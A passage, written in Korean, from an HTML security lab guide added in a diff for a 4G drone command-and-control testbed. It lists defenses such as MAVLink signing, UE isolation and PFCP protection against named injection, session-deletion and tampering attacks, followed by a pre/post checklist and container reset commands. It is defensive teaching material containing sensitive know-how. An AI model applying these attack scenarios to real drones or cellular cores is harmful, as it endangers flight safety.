+<!-- ============================ 4. 방어 ============================ -->
+<div class="section" id="def">
+  <div class="sh"><span class="sn g">4</span>방어 검증 — 공격이 막히는지 대비 실측</div>
+  <div class="ss">각 공격 직후 방어를 켜고 동일 절차를 재실행해 "차단"을 관측한다</div>
+
+  <table>
+    <tr><th>방어</th><th>대상 공격</th><th>적용 지점</th><th>기대 결과</th></tr>
+    <tr><td>MAVLink v2 서명<br>(<code>accept_unsigned_packets=0</code>)</td><td>TM1 주입, TM3 변조</td><td>UAV/GCS 양단(앱 계층)</td><td>미서명·변조 패킷 <span class="tag tg">거부</span></td></tr>
+    <tr><td>UE-to-UE 격리<br>(UPF ACL / Private APN)</td><td>TM1</td><td>UPF/APN 정책</td><td>ROGUE→UAV 도달 <span class="tag tg">차단</span></td></tr>
+    <tr><td>PFCP IPsec(Sxb') · S11 ACL</td><td>TM2</td><td>코어 제어망</td><td>세션삭제 요청 <span class="tag tg">무효화</span></td></tr>
+    <tr><td>코어망 물리/논리 분리</td><td>TM2, TM3(vRAN)</td><td>망 아키텍처</td><td>공격자 도달 자체 <span class="tag tg">차단</span></td></tr>
+  </table>
+  <div class="hl hl-ok"><b>핵심 대비:</b> TM1/TM3 은 앱 계층 <b>MAVLink 서명</b>으로 종단 방어가 성립한다(무결성·인증). 그러나 TM2(가용성)는 서명으로 못 막고 <b>코어망 분리·PFCP 보호</b>가 유일한 방어다 — 이 비대칭을 보고서에 명확히 구분해 기술하면 완성도가 오른다.</div>
+  <div class="hl hl-warn">서명 검증 실습은 기존 브로드캐스트 testbed 의 서명 배선(<code>*_signing</code>)을 참고. 4G 트랙에 서명을 적용하려면 SITL/GCS 양측 <code>MAV_*_KEY</code>·<code>accept_unsigned_packets</code> 파라미터를 맞춰야 한다.</div>
+</div>
+
+<!-- ============================ 5. 원복 ============================ -->
+<div class="section" id="reset">
+  <div class="sh"><span class="sn">5</span>관측 체크리스트 · 원복</div>
+  <div class="ss">실습 전후 상태를 동일 기준으로 비교</div>
+
+  <h3>5-1. 관측 체크리스트 (공격 전/후 비교)</h3>
+  <table>
+    <tr><th>지표</th><th>확인 명령</th><th>정상</th><th>공격 성립</th></tr>
+    <tr><td>UAV↔GCS C2</td><td><code>g1_gcs.py</code> (GCS netns)</td><td>HEARTBEAT 수신</td><td>타임아웃/변조</td></tr>
+    <tr><td>데이터 베어러</td><td><code>ping 192.168.100.1</code> (UE netns)</td><td>응답</td><td>실패(TM2)</td></tr>
+    <tr><td>UE-to-UE</td><td><code>ping 192.168.100.2</code> (ROGUE)</td><td>도달(TM1 전제)</td><td>격리 시 차단</td></tr>
+    <tr><td>비행 상태</td><td>Gazebo <code>:6080</code> / <code>g2_flight.py</code></td><td>정상 비행</td><td>추락/이상 기동</td></tr>
+  </table>
+
+  <h3>5-2. 원복</h3>
+  <div class="code"><span class="cm"># TM3 iptables 규칙 제거 (3-5)</span>
+docker exec srsenb_zmq iptables -F
+
+<span class="cm"># 공격 도구 컨테이너 정리</span>
+docker rm -f dah4g-attacker 2>/dev/null
+
+<span class="cm"># SITL 재기동으로 깨끗한 상태 복귀 (필요 시)</span>
+docker rm -f dah4g-sitl 2>/dev/null; bash testbed-4g/scripts/40-g1-c2.sh
+
+<span class="cm"># RAN 재동기화가 필요하면 eNB→UE 순서로 재기동 (ZMQ desync 방지)</span>
+<span class="cm">#   bash testbed-4g/scripts/20-ran-up.sh ; bash testbed-4g/scripts/30-add-ue.sh 2 ; ... 3</span></div>
+
+  <div class="hl hl-key">각 공격은 독립 실습이 원칙이다. TM2/TM3 는 세션·베어러 상태를 훼손하므로, 다음 실습 전 5-2 로 원복하고 <b>0-3</b> 사전 확인을 다시 통과시킨 뒤 진행할 것.</div>
+</div>
+
+</body>
+</html>
